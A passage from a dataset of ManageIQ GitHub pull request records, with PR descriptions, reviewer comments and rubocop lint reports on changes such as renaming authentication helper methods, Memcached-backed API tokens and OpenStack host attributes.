[Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for preload_data is too high. [16.12/15]\n- [ ] :large_orange_diamond: - [Line 808](https://github.com/Ladas/manageiq/blob/223bceaf0e844890b4e680e9108cb8ad30638145/vmdb/spec/models/metric/ci_mixin/capture/openstack_spec.rb#L808), Col 5 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for preload_data is too high. [15.26/15]\n- [ ] :large_orange_diamond: - [Line 912](https://github.com/Ladas/manageiq/blob/223bceaf0e844890b4e680e9108cb8ad30638145/vmdb/spec/models/metric/ci_mixin/capture/openstack_spec.rb#L912), Col 3 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for make_calculation is too high. [22/15]\n- [ ] :large_orange_diamond: - [Line 912](https://github.com/Ladas/manageiq/blob/223bceaf0e844890b4e680e9108cb8ad30638145/vmdb/spec/models/metric/ci_mixin/capture/openstack_spec.rb#L912), Col 23 - [Metrics/ParameterLists](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/ParameterLists) - Avoid parameter lists longer than 5 parameters.\n', 'Comments addressed.\r\n\r\nI think only branch not covered with tests is single counter diff. But I guess we will do that, when we have meter like that. :-)\r\n\r\nWhat coverage will not show are different scenarios with messed up data. I guess, that should go to doc too. And if we will see data behave in another wrong way, we would add more specs. But I guess the current scenarios should cover like 98 percent of cases. \r\n\r\nIf things will go more wrong, I would say it will be because of some OpenStack bug,\r\n']"
46,ManageIQ/manageiq,1526.0,https://bugzilla.redhat.com/show_bug.cgi?id=1126020,"['@blomquisg @tenderlove @Fryguy please review.  I moved the require into the vmdb_helper which is required very early on for all processes from [vmdb/logging](https://github.com/ManageIQ/manageiq/blob/49e5b0bd356a4a9dd380076f27cf0c6eff01ad6d/vmdb/lib/vmdb/logging.rb#L2) which is required from [application](https://github.com/ManageIQ/manageiq/blob/49e5b0bd356a4a9dd380076f27cf0c6eff01ad6d/vmdb/config/application.rb#L99)\r\n\r\n', 'LGTM! :+1: ', '@Fryguy this is ready to go... any idea why we have two travis checks here?  both details link to the same green test result??? WAT?  :confused: ', 'Something hiccuped with travis...if one is green the PR is green']"
47,ManageIQ/manageiq,1801.0,"- Leveraging Memcached to make sure tokens work across workers
- Using Dalli::Client's interface and token cleanup support.
- Removing Token Manager token cleanup code
- Removing api token_cleanup_interval configuration
- Rubocop changes

https://trello.com/c/Drza2h1q","['yep, failed as expected, will need to use ActiveSupport::Cache::MemoryStore in travis case and use the common methods (read/write/etc) instead of the Dalli provided add/set/get.  Will update accordingly.', ""@Fryguy yea, green on Travis with the MemoryStore/DalliStore changes. I'll apply the changes you mentioned above and repush. Thanks."", '<rubocop />Checked commits https://github.com/abellotti/manageiq/commit/8981b09369d7affb7831633e2e56355935a69e53 .. https://github.com/abellotti/manageiq/commit/12c70b211e05d304b607037bd10c240166941fd5 with rubocop 0.27.1\n2 files checked, 0 offenses detected\nEverything looks good. :cake:\n', '@Fryguy with the renamed method/private section/Time object stashed as discussed. Anything else or are we good to merge ?', '@jrafanie See here for the memcached stuff related to #1834 ']"
48,ManageIQ/manageiq,1750.0,"authentication_valid? is badly named since it only means we had the userid, not
that the authentication was valid.

Calling code ""may"" have assumed it meant that the authentication was valid.

For example, #1691 shows how client code was duped into thinking authentication_valid?
meant more than has_credentials? and caused workers to continually restart when
the authentications couldn't be validated due to bad password, unreachable systems, etc.

has_credentials? or missing_credentials? is closer to the truth.

The resulting calling code seems to read much clearer now.

Followup to #1691

Rather than keep authentication_valid? and _invalid?, it's probably better to just remove all traces of the confusing method names.","['What?  A net-deletion of only 1 line?  :disappointed: ', 'cc @blomquisg @Fryguy @brandondunne @gmcculloug @lfu @roliveri @tenderlove @chessbyte @kbrock @lfu @bzwei  If you\'ve ever used authentication_valid? or authentication_invalid? on our Ems/Hosts/FileDepots, please see above... I\'m removing it because it\'s confusing.  \r\n\r\nUse this handy cheat sheet for when to use the remaining methods:\r\nhas_credentials?  - it has credentials\r\nmissing_credentials?  - it is missing credentials\r\nauthentication_status_ok? - the last authentication check against the remote system was ""Valid""', 'Yes, only 1 net deletion... :cry: ', ':100: This whole thing reads much better than before!  Good job', '@jrafanie I think we should fix the ""wrong"" usages of has_credentials in this PR, just in follow up commits, based on input from all the people mentioned above.  I\'ll comment on what I know.\r\n\r\nAlso, `authentication_status_ok?` depends on something coming along and actually verifying the credentials.  For EMSes, I believe this is scheduled.  However, is there something in place for other authentications, like, say, FileDepot?  Even so, I believe that when someone clicks verify in the UI (i.e. when verify_credentials is called), then we should set the authentication_status to ok at that time, since at least at that moment we are sure of it.', '@jrafanie I comment on all the parts I recognized.  Additionally, I think all of the `.connect` methods and `.verify_credentials` methods are correct as is with the `missing_credentials?` check, and should not change to `authentication_status_ok`', ""> Additionally, I think all of the `.connect` methods and `.verify_credentials` methods are correct as is with the `missing_credentials?` check, and should not change to `authentication_status_ok`\r\n\r\nK, this makes sense.  But, we should be using `authentication_status_ok` in places where we're about to make connections, like before refreshes and scans."", '> where we\'re about to make connections, like before refreshes and scans.\r\n\r\nYes, as long as there is a mechanism outside of that code that checks the credentials on some regular basis.  Don\'t want to get into a situation where it temporarily goes bad, and then it can never connect again.\r\n\r\nIncidentally, we probably should immediately mark it as ""bad"" if during the refresh or scan we detect a bad set of credentials.', '> Also, authentication_status_ok? depends on something coming along and actually verifying the credentials. For EMSes, I believe this is scheduled. However, is there something in place for other authentications, like, say, FileDepot? Even so, I believe that when someone clicks verify in the UI (i.e. when verify_credentials is called), then we should set the authentication_status to ok at that time, since at least at that moment we are sure of it.\r\n\r\nSo, I believe we only check if the authentication [was changed](https://github.com/jrafanie/manageiq/blob/82027846ff1aab1943cad86c97ffc1ff9c065513/vmdb/app/models/authentication.rb#L85).  If it was previously ""bad"" because the system was down and we click validate, it wouldn\'t change ""status"".\r\n\r\nWhen you click validate in the UI, it could be using credentials that are not yet persisted since it\'s very likely someone could be entering a Ems/Host/etc for the first time and wants to validate the creds before saving.    We\'d have to change the UI code to call Authentication#authentication_check(type) instead of verify_credentials if we have an authentication. \r\n\r\n', '> Yes, as long as there is a mechanism outside of that code that checks the credentials on some regular basis. Don\'t want to get into a situation where it temporarily goes bad, and then it can never connect again.\r\n\r\nYes, agreed.  Maybe the schedule of once per day is a bit paranoid.  \r\n \r\n> Incidentally, we probably should immediately mark it as ""bad"" if during the refresh or scan we detect a bad set of credentials.\r\n\r\nIf we use authentication_check(type) instead of verify_credentials wherever the latter is used, it will mark the creds as bad and return true/false if it was successful.', 'So, @Fryguy @blomquisg I have applied all of the suggested changes.  I still have to clean up the last commit to add some tests but I think I got everything else.  Did I miss anything?  See the last 6 commits.', '@miq-bot add_label needs changelog', '<rubocop />Checked commits https://github.com/jrafanie/manageiq/commit/415eee11e8153b6a6eab9b5bb0078243b2790664 .. https://github.com/jrafanie/manageiq/commit/7b32deb2e4a0e8d872c068682582da1a453c88bb with rubocop 0.27.1\n32 files checked, 48 offenses detected\n\n**vmdb/app/models/ext_management_system.rb**\n- [ ] :small_blue_diamond: - [Line 212](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/ext_management_system.rb#L212), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [131/120]\n\n**vmdb/app/models/host.rb**\n- [ ] :large_orange_diamond: - [Line 794](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/host.rb#L794), Col 40 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 796](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/host.rb#L796), Col 11 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 824](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/host.rb#L824), Col 80 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 825](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/host.rb#L825), Col 92 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 826](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/host.rb#L826), Col 102 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 1588](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/host.rb#L1588), Col 41 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :small_blue_diamond: - [Line 825](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/host.rb#L825), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [134/120]\n- [ ] :small_blue_diamond: - [Line 826](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/host.rb#L826), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [153/120]\n\n**vmdb/app/models/miq_host_provision/state_machine.rb**\n- [ ] :large_orange_diamond: - [Line 13](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/miq_host_provision/state_machine.rb#L13), Col 20 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 13](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/miq_host_provision/state_machine.rb#L13), Col 99 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :small_blue_diamond: - [Line 13](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/miq_host_provision/state_machine.rb#L13), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [135/120]\n\n**vmdb/app/models/miq_provision/options_helper.rb**\n- [ ] :small_blue_diamond: - [Line 29](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/miq_provision/options_helper.rb#L29), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [183/120]\n\n**vmdb/app/models/miq_proxy.rb**\n- [ ] :large_orange_diamond: - [Line 246](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/miq_proxy.rb#L246), Col 10 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 1000](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/miq_proxy.rb#L1000), Col 123 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :small_blue_diamond: - [Line 1000](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/miq_proxy.rb#L1000), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [186/120]\n\n**vmdb/app/models/miq_schedule.rb**\n- [ ] :small_blue_diamond: - [Line 305](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/miq_schedule.rb#L305), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [134/120]\n\n**vmdb/app/models/miq_vim_broker_worker.rb**\n- [ ] :small_blue_diamond: - [Line 23](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/miq_vim_broker_worker.rb#L23), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [123/120]\n\n**vmdb/app/models/mixins/authentication_mixin.rb**\n- [ ] :large_orange_diamond: - [Line 37](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/mixins/authentication_mixin.rb#L37), Col 7 - [Style/PredicateName](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/PredicateName) - Rename `has_credentials?` to `credentials?`.\n\n**vmdb/app/models/storage.rb**\n- [ ] :large_orange_diamond: - [Line 86](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/storage.rb#L86), Col 5 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 90](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/storage.rb#L90), Col 5 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 365](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/storage.rb#L365), Col 13 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n\n**vmdb/app/models/vm_or_template.rb**\n- [ ] :large_orange_diamond: - [Line 331](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L331), Col 8 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 331](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L331), Col 38 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 331](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L331), Col 94 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 1067](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L1067), Col 23 - [Style/SpaceInsideBlockBraces](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/SpaceInsideBlockBraces) - Space between { and | missing.\n- [ ] :large_orange_diamond: - [Line 1067](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L1067), Col 38 - [Style/CaseEquality](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/CaseEquality) - Avoid the use of the case equality operator `===`.\n- [ ] :large_orange_diamond: - [Line 1067](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L1067), Col 43 - [Style/SpaceInsideBlockBraces](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/SpaceInsideBlockBraces) - Space missing inside }.\n- [ ] :large_orange_diamond: - [Line 1168](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L1168), Col 80 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 1169](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L1169), Col 92 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 1170](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L1170), Col 102 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 1181](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L1181), Col 80 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 1182](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L1182), Col 92 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 1183](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L1183), Col 102 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 1188](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L1188), Col 80 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 1189](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L1189), Col 92 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 1190](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L1190), Col 102 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :small_blue_diamond: - [Line 331](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L331), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [137/120]\n- [ ] :small_blue_diamond: - [Line 1169](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L1169), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [134/120]\n- [ ] :small_blue_diamond: - [Line 1170](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L1170), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [153/120]\n- [ ] :small_blue_diamond: - [Line 1182](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L1182), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [134/120]\n- [ ] :small_blue_diamond: - [Line 1183](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L1183), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [153/120]\n- [ ] :small_blue_diamond: - [Line 1189](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L1189), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [134/120]\n- [ ] :small_blue_diamond: - [Line 1190](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/app/models/vm_or_template.rb#L1190), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [153/120]\n\n**vmdb/spec/models/host_spec.rb**\n- [ ] :large_orange_diamond: - [Line 68](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/spec/models/host_spec.rb#L68), Col 35 - [Style/BracesAroundHashParameters](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/BracesAroundHashParameters) - Redundant curly braces around a hash parameter.\n- [ ] :large_orange_diamond: - [Line 78](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/spec/models/host_spec.rb#L78), Col 35 - [Style/BracesAroundHashParameters](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/BracesAroundHashParameters) - Redundant curly braces around a hash parameter.\n\n**vmdb/spec/models/mixins/authentication_mixin_spec.rb**\n- [ ] :large_orange_diamond: - [Line 51](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/spec/models/mixins/authentication_mixin_spec.rb#L51), Col 9 - [Style/CaseIndentation](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/CaseIndentation) - Indent `when` as deep as `case`.\n- [ ] :large_orange_diamond: - [Line 53](https://github.com/jrafanie/manageiq/blob/7b32deb2e4a0e8d872c068682582da1a453c88bb/vmdb/spec/models/mixins/authentication_mixin_spec.rb#L53), Col 9 - [Style/CaseIndentation](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/CaseIndentation) - Indent `when` as deep as `case`.\n', 'Wow, @Fryguy @blomquisg @gmcculloug @kbrock, this is finally passing and I *think* I addressed all of your comments without chasing too many :sparkles: objects', 'Looks good to me! :+1: @blomquisg @gmcculloug If you are good with this, please merge.', '@blomquisg @gmcculloug please review/merge :bow: :heart: ', 'Nice job @jrafanie  :star: ', ':tada: Yay!!!', ':cake: yay']"
49,ManageIQ/manageiq,1849.0,"This pull request changes `VmdbDatabaseConnection` to inherit from `ActiveRecord::Base` rather than `ActsAsArModel`.  It removes one dependency on `ActsAsArModel`, and also fixes tests on Rails 4 (since we don't have to specifically call typecasting code ourselves).","['This is awesome...great work!', ""@tenderlove This looks epic.  I haven't reviewed it yet but thanks for tackling this beast.  :star: "", 'Can I get some help on this?  `rake test:vmdb` runs green for me on this branch.  Running the individual test that Travis is complaining about also runs green locally.  Can anyone repro the red test?', '<rubocop />Checked commits https://github.com/tenderlove/manageiq/commit/d12323d047e82abb33fd6eaff9bd11b1c8daa069 .. https://github.com/tenderlove/manageiq/commit/2c4dc077c072b3563e8ce0a309dc64f4ebc3efcd with rubocop 0.27.1\n8 files checked, 1 offense detected\n\n**vmdb/app/models/vmdb_database_lock.rb**\n- [ ] :small_blue_diamond: - [Line 13](https://github.com/tenderlove/manageiq/blob/2c4dc077c072b3563e8ce0a309dc64f4ebc3efcd/vmdb/app/models/vmdb_database_lock.rb#L13), Col 3 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for blocking_lock_relation is too high. [22.56/15]\n', 'Never mind.  I was able to figure out the problem.', ""Wow, very nice @tenderlove.  I'm not sure how to test this more than the unit tests.  Were you able to browse the UI with this change?  I believe you can try `bin/rails r 'EvmDatabase.seed'` then `bin/rails s` and click around.  I'm not even sure where this is found but it's probably somewhere in Configure -> Configuration -> Database (in accordion).. select VMDB, then click through the tabs Summary, Settings, client connections, etc.\r\n\r\n![screen shot 2015-02-24 at 5 50 25 pm](https://cloud.githubusercontent.com/assets/19339/6361154/b62c4b64-bc4d-11e4-80b2-d1cdc73d1356.png)\r\n"", ""Note, @tenderlove, my appliance from a few weeks ago got this error when I clicked client connections tab.\r\n\r\n```\r\nError text:\r\n\r\nundefined method `reflect_on_association' for VmdbDatabaseConnection:Class [ops/change_tab]\r\n```\r\n\r\nSo, I think that's the right place :bomb: :-)"", ""@jrafanie ya, I wrote a spec for the db connection tab here: 5a1fc1d4 That's the one that was making the build red before I fixed it in 1867d70"", 'Cool, thanks @tenderlove ', 'Is there anything else I need to do on this before we can merge it? @Fryguy @jrafanie ', ""I'll check...haven't been reviewing much in the past few days."", '@Fryguy I need #1984 merged before this one.  We need to use the the changes in that PR to make this one backwards compatible.', 'OK, thanks']"
50,ManageIQ/manageiq,1743.0,"Collecting heat related attributes for OpenstackInfra Host

It's up to debate which of the commits are really needed, I am filling blank spaces where I feel it's appropriate, though that doesn't make it right. :-)

1) commit is the most important, it implements the Node Type task, so you have info in host name whether host is compute, controller, storage, etc. And you can use to for writing filter, automate, etc.
Wording and format of hostname could be better here.

2) commit
vmm_vendor, it's hardcoded to RedHat and OS is hardcoded to rhel, cause we support only that. Later we could try to fetch actual OS from somewhere.
vmm_product, wording could be much better here, basically it either has NovaCompute hypervisor, or there is no hypervisor at all, so I am stating purpose of the node. 

Seems like vmm product is used on stats on dashboard. So better to differ between node types. Or should it be all rhel? For other providers vmm_product marks what hypervisor it uses.

3) commit 
hardcoding operating system to linux, that is all we support now

4)  commit
not really sure what is connection state good for, I made it the same as in rhev and I though it will be connected to the right-down corner icon of the host list, but it's not. Seems like that requires some credentials for direct approach to host.

5) commit 
tests
","[""@ladas, same here as for #1771.  Can you add a explanation as to why this is needed?  Obviously, capturing Heat stacks is important in the long run, but I believe there's a specific feature you're working on that depends on this.\r\n\r\nThanks"", '@blomquisg Updated description. Now I know what is the description for when I have more commits. :-)', '<gemfile_checker />@JPrause @jvlcek Gemfile changes detected in commit https://github.com/Ladas/manageiq/commit/52cdb9393bed06a81d9b056ff0a56cc09dec961f.  Please review.', '@JPrause @jvlcek sorry for the spam, the commit here is just dependency, please review gem change here https://github.com/ManageIQ/manageiq/pull/1354', ""@blomquisg  adding tests, I hope one commit for them all is ok, so I don't have to do many cassette refreshes"", 'dependency has been merged, it should be ready now', '<rubocop />Checked commits https://github.com/Ladas/manageiq/commit/991c36584f5c255235a8c2d02d29410dd03faed2 .. https://github.com/Ladas/manageiq/commit/08a1bb731bd3a2455dcc8ccffa4a194633d95fa5 with rubocop 0.27.1\n3 files checked, 0 offenses detected\nEverything looks good. :star:\n', '@blomquisg could you restart the CI job? For some reason it timeouts. Tests works for me locally', '@ladas, restarted ... probably just a fluke', ""@Ladas @blomquisg Please capture the relevant output from travis if there's any chance it's a test ordering bug and open an issue.  We have to clean up these sporadic test failures to avoid wasted developer time checking travis, determining it's not their bug, restarting travis, etc. multiplied by every developer that hits it.  At this point, we've nailed many of the worst test ordering bugs but we have to investigate fluke failures to be proactive."", '@jrafanie it never even started the tests ... it failed before it could even start with a timeout error.  So, no seed number or anything.', ""@jrafanie I'll keep that in mind, although this time it just timeouted without starting any test, not sure what to do with that"", 'Ok @Ladas @blomquisg...  Thanks!']"
51,ManageIQ/manageiq,2013.0,"This PR extracts accordion data to objects and removes duplicated logic.  I also added test coverage for those actions.

